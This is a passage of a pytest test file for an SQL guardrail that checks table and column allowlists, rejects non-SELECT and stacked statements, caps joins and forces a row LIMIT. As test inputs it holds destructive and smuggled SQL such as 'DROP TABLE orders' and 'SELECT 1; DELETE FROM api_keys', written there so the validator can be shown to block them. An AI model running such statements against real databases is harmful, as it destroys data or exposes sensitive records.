    out = run(policy, "analyst", "DROP TABLE orders", check_ast=False)
    assert [r.layer for r in out.results] == [ALLOWLIST]
    assert out.results[0].decision == Decision.ALLOW
    assert out.sql == "DROP TABLE orders"
    assert_block(policy, "analyst", "DELETE FROM api_keys", ALLOWLIST, "allowlist.table_denied")
    assert_block(policy, "analyst", "SELECT 1; DELETE FROM api_keys", ALLOWLIST, "allowlist.table_denied")
    assert_block(policy, "analyst", "SELECT id FROM orders; SELECT ssn FROM users", ALLOWLIST, "allowlist.column_denied")


def test_ast_only_ignores_objects(policy):
    out = run(policy, "analyst", "SELECT ssn FROM api_keys", check_allowlist=False)
    assert [r.layer for r in out.results] == [AST]
    assert not out.blocked
    assert out.sql.endswith("LIMIT 1000")


def test_result_order_and_layers(policy):
    out = run(policy, "analyst", "SELECT id FROM orders")
    assert [r.layer for r in out.results] == [ALLOWLIST, AST]
    assert all(r.latency_ms >= 0 for r in out.results)


def test_blocked_by_allowlist_leaves_sql_untouched_even_if_ast_ok(policy):
    sql = "SELECT   ssn   FROM users"
    out = run(policy, "analyst", sql)
    assert out.blocked
    assert out.sql == sql
    res = by_layer(out)
    assert res[ALLOWLIST].blocked and not res[AST].blocked


def test_both_layers_report_independently(policy):
    out = run(policy, "analyst", "DELETE FROM api_keys")
    res = by_layer(out)
    assert res[ALLOWLIST].rule_id == "allowlist.table_denied"
    assert res[AST].rule_id == "ast.non_select"


# ----------------------------------------------------------------------------- forced LIMIT

LIMIT_CASES = [
    ("SELECT id FROM orders", "LIMIT 1000", True, 1000),
    ("SELECT id FROM orders LIMIT 5000", "LIMIT 1000", True, 1000),
    ("SELECT id FROM orders LIMIT 1000", "LIMIT 1000", False, 1000),
    ("SELECT id FROM orders LIMIT 10", "LIMIT 10", False, 10),
    ("SELECT id FROM orders LIMIT 0", "LIMIT 0", False, 0),
    ("SELECT id FROM orders LIMIT ALL", "LIMIT 1000", True, 1000),
    ("SELECT id FROM orders LIMIT 1 + 1", "LIMIT 1000", True, 1000),
    ("SELECT id FROM orders LIMIT (SELECT 5)", "LIMIT 1000", True, 1000),
    ("SELECT id FROM orders FETCH FIRST 50000 ROWS ONLY", "LIMIT 1000", True, 1000),
    ("SELECT id FROM orders FETCH FIRST 5 ROWS ONLY", "FETCH FIRST 5 ROWS ONLY", False, 5),
    ("SELECT id FROM orders ORDER BY id FETCH FIRST 5 ROWS WITH TIES", "LIMIT 1000", True, 1000),
    ("SELECT id FROM orders LIMIT 5 OFFSET 20", "LIMIT 5", False, 5),
    ("SELECT id FROM orders OFFSET 20", "LIMIT 1000", True, 1000),
    ("SELECT id FROM orders UNION SELECT id FROM products", "LIMIT 1000", True, 1000),
    ("SELECT id FROM orders UNION SELECT id FROM products LIMIT 7", "LIMIT 7", False, 7),
    ("(SELECT id FROM orders LIMIT 5) UNION ALL (SELECT id FROM products LIMIT 5)", "LIMIT 1000", True, 1000),
    ("WITH c AS (SELECT id FROM orders LIMIT 5) SELECT id FROM c", "LIMIT 1000", True, 1000),
    ("SELECT id FROM (SELECT id FROM orders LIMIT 5) t", "LIMIT 1000", True, 1000),
    ("(SELECT id FROM orders)", "LIMIT 1000", True, 1000),
]


@pytest.mark.parametrize("sql,tail,forced,limit", LIMIT_CASES)
def test_forced_limit(policy, sql, tail, forced, limit):
    out = assert_allow(policy, "analyst", sql)
    assert out.sql.rstrip().endswith(tail) or (" OFFSET " in out.sql and tail in out.sql), out.sql
    assert by_layer(out)[AST].details == {"forced_limit": forced, "limit": limit}
    assert len(sqlglot.parse(out.sql, dialect="postgres")) == 1


def test_forced_limit_applies_to_whole_union(policy):
    out = assert_allow(policy, "analyst", "SELECT id FROM orders UNION SELECT id FROM products")
    tree = sqlglot.parse_one(out.sql, dialect="postgres")
    assert type(tree).__name__ == "Union"
    assert tree.args["limit"].expression.name == "1000"
    assert out.sql.count("LIMIT") == 1


def test_limit_uses_policy_limit(policy):
    import dataclasses

    small = dataclasses.replace(policy, limits=dataclasses.replace(policy.limits, max_rows=25))
    out = validate_sql("SELECT id FROM orders LIMIT 100", small.role("analyst"), small)
    assert out.sql.endswith("LIMIT 25")
    out = validate_sql("SELECT id FROM orders LIMIT 20", small.role("analyst"), small)
    assert out.sql.endswith("LIMIT 20")


def test_no_rewrite_when_ast_off(policy):
    sql = "SELECT id   FROM orders"
    out = run(policy, "analyst", sql, check_ast=False)
    assert out.sql == sql


# ----------------------------------------------------------------------------- rewrite round trip

ROUND_TRIP = [
    ("SELECT o.id, p.name FROM orders o JOIN order_items i ON i.order_id = o.id JOIN products p ON p.id = i.product_id", ["JOIN"]),
    ("WITH c AS (SELECT id, status FROM orders) SELECT status, count(*) FROM c GROUP BY status", ["WITH c AS"]),
    ("SELECT id, row_number() OVER (PARTITION BY region ORDER BY order_date DESC) rn FROM orders", ["OVER (PARTITION BY region ORDER BY order_date DESC)"]),
    ("SELECT CASE WHEN total_amount > 1 THEN 'a' ELSE 'b' END FROM orders", ["CASE WHEN"]),
    ("SELECT date_trunc('month', order_date) FROM orders", ["DATE_TRUNC"]),
    ("SELECT total_amount::numeric, id::text FROM orders", ["CAST("]),
    ("SELECT id FROM orders WHERE status = 'it''s a ''test'''", ["'it''s a ''test'''"]),
    ("SELECT id FROM orders WHERE status ILIKE '%a%'", ["ILIKE"]),
    ("SELECT id FROM orders WHERE status IN ('a', 'b', 'c')", ["IN ('a', 'b', 'c')"]),
    ("SELECT id FROM orders WHERE order_date > now() - interval '3 days'", ["INTERVAL '3 DAYS'"]),
    ("SELECT sum(total_amount) FILTER (WHERE status = 'x') FROM orders", ["FILTER(WHERE status = 'x')"]),
    ("SELECT string_agg(status, ', ' ORDER BY status) FROM orders", ["STRING_AGG(status, ', ' ORDER BY status)"]),
    ("SELECT percentile_cont(0.5) WITHIN GROUP (ORDER BY total_amount) FROM orders", ["WITHIN GROUP (ORDER BY total_amount)"]),
    ("SELECT extract(year FROM order_date) FROM orders", ["EXTRACT(YEAR FROM order_date)"]),
    ("SELECT status, count(DISTINCT user_id) FROM orders GROUP BY status HAVING count(*) > 1", ["COUNT(DISTINCT user_id)", "HAVING"]),
    ("SELECT id FROM orders ORDER BY total_amount DESC NULLS LAST", ["DESC NULLS LAST"]),
    ("SELECT to_char(order_date, 'FMDay, DD Month YYYY HH24:MI:SS') FROM orders", ["'FMDay, DD Month YYYY HH24:MI:SS'"]),
    ("SELECT substring(status from 1 for 2), position('a' in status), trim(both 'x' from status) FROM orders", ["SUBSTRING("]),
    ("SELECT coalesce(sales_rep_id, 0), nullif(status, ''), greatest(id, 2) FROM orders", ["COALESCE(", "NULLIF(", "GREATEST("]),
    ("SELECT id FROM orders WHERE total_amount BETWEEN 1 AND 2 AND region IS NOT NULL", ["BETWEEN 1 AND 2", "IS NOT NULL"]),
    ("SELECT age(order_date), make_date(2020, 1, 1), current_date FROM orders", ["AGE(order_date)", "CURRENT_DATE"]),
    ("SELECT id FROM orders o WHERE EXISTS (SELECT 1 FROM users u WHERE u.id = o.user_id)", ["EXISTS("]),
    ("SELECT round(total_amount, 2), ceil(total_amount), floor(total_amount), power(total_amount, 2) FROM orders", ["ROUND(", "POWER("]),
    ("SELECT id FROM orders WHERE status = 'a;b' OR status = '-- x' OR status = '/* y */'", ["'a;b'", "'-- x'", "'/* y */'"]),
]


@pytest.mark.parametrize("sql,needles", ROUND_TRIP)
def test_rewrite_round_trip(policy, sql, needles):
    out = assert_allow(policy, "analyst", sql)
    assert out.sql != sql or "LIMIT" in sql
    for n in needles:
        assert n in out.sql, (n, out.sql)
    assert out.sql.endswith("LIMIT 1000")
    # idempotent: validating the rewritten SQL again changes nothing
    again = assert_allow(policy, "analyst", out.sql)
    assert again.sql == out.sql
    assert by_layer(again)[AST].details["forced_limit"] is False


# ----------------------------------------------------------------------------- join analysis

NOT_CARTESIAN = [
    "SELECT a.id FROM orders a, orders b WHERE a.id = b.id",
    "SELECT a.id FROM orders a, orders b WHERE b.user_id = a.user_id AND a.id < b.id",
    "SELECT a.id FROM orders a CROSS JOIN orders b WHERE a.user_id = b.user_id",
    "SELECT a.id FROM orders a JOIN orders b USING (id)",
    "SELECT a.id FROM orders a NATURAL JOIN order_items b",
    "SELECT a.id FROM orders a JOIN orders b ON a.user_id = b.user_id",
    "SELECT a.id FROM orders a JOIN LATERAL (SELECT i.id FROM order_items i WHERE i.order_id = a.id LIMIT 1) l ON true",
    "SELECT a.id FROM orders a, LATERAL (SELECT i.id FROM order_items i WHERE i.order_id = a.id) l",
    "SELECT id FROM orders o JOIN users u ON u.id = o.user_id",
    "SELECT o.id FROM orders o JOIN users u ON u.id = o.user_id JOIN order_items i ON i.order_id = o.id",
]


@pytest.mark.parametrize("sql", NOT_CARTESIAN)
def test_not_cartesian(policy, sql):
    out = run(policy, "analyst", sql, check_allowlist=False)
    assert not out.blocked, out.results[0].reason


def test_six_joins_allowed_seven_blocked(policy):
    assert not run(policy, "analyst", _join_chain(6), check_allowlist=False).blocked
    assert_block(policy, "analyst", _join_chain(7), AST, "ast.too_many_joins")


def test_depth_four_allowed(policy):
    sql = "SELECT * FROM (SELECT * FROM (SELECT * FROM (SELECT 1 AS a) t1) t2) t3"
    assert not run(policy, "analyst", sql, check_allowlist=False).blocked


def test_four_set_ops_boundary(policy):
    ok = "SELECT 1 UNION SELECT 2 UNION SELECT 3 UNION SELECT 4"
    assert not run(policy, "analyst", ok, check_allowlist=False).blocked


def test_four_subqueries_boundary(policy):
    ok = "SELECT (SELECT 1), (SELECT 2), (SELECT 3), (SELECT 4)"
    assert not run(policy, "analyst", ok, check_allowlist=False).blocked


def test_sql_length_boundary(policy):
    sql = "SELECT 1 -- " + "x" * (4000 - len("SELECT 1 -- "))
    assert len(sql) == 4000
    assert not run(policy, "analyst", sql, check_allowlist=False).blocked


# ----------------------------------------------------------------------------- misc invariants

def test_blocked_sql_is_byte_identical(policy):
    sql = "  select\n  ssn   from users ;  "
    out = run(policy, "analyst", sql)
    assert out.blocked and out.sql == sql


def test_parsed_flag(policy):
    assert run(policy, "analyst", "SELECT id FROM orders").parsed
    assert not run(policy, "analyst", "SELECT FROM WHERE").parsed
    assert not run(policy, "analyst", "").parsed


def test_dialect_override_unused_default(policy):
    out = validate_sql("SELECT id FROM orders", policy.role("analyst"), policy, dialect="postgres")
    assert not out.blocked


# ----------------------------------------------------------------------------- Policy.allow_all with sqlite

SINGER_SCHEMA = {
    "singer": ["singer_id", "name", "country", "age"],
    "concert": ["concert_id", "singer_id", "year", "venue"],
}


@pytest.fixture(scope="module")
def sqlite_policy():
    return Policy.allow_all(SINGER_SCHEMA, dialect="sqlite")


@pytest.mark.parametrize(
    "sql",
    [
        "SELECT name FROM singer WHERE age > 30 ORDER BY age DESC",
        "SELECT count(*) FROM singer",
        "SELECT T1.name, T2.year FROM singer AS T1 JOIN concert AS T2 ON T1.singer_id = T2.singer_id",
        "SELECT country, avg(age) FROM singer GROUP BY country HAVING count(*) > 1",
        "SELECT name FROM singer WHERE singer_id NOT IN (SELECT singer_id FROM concert)",
        "SELECT * FROM singer",
    ],
)
def test_allow_all_sqlite_allows(sqlite_policy, sql):
    role = sqlite_policy.role("all")
    out = validate_sql(sql, role, sqlite_policy)
    assert not out.blocked, [(r.rule_id, r.reason) for r in out.results]
    assert "LIMIT 1000" in out.sql.upper()
    assert out.masked_outputs == {}


@pytest.mark.parametrize(
    "sql,rule",
    [
        ("SELECT * FROM stadium", "allowlist.table_denied"),
        ("SELECT nope FROM singer", "allowlist.unresolved_column"),
        ("DROP TABLE singer", "ast.non_select"),
        ("SELECT name FROM singer; SELECT 1", "ast.multi_statement"),
        ("SELECT sqlite_version()", "allowlist.function_denied"),
    ],
)
def test_allow_all_sqlite_blocks(sqlite_policy, sql, rule):
    role = sqlite_policy.role("all")
    out = validate_sql(sql, role, sqlite_policy)
    assert rule in [r.rule_id for r in out.results]
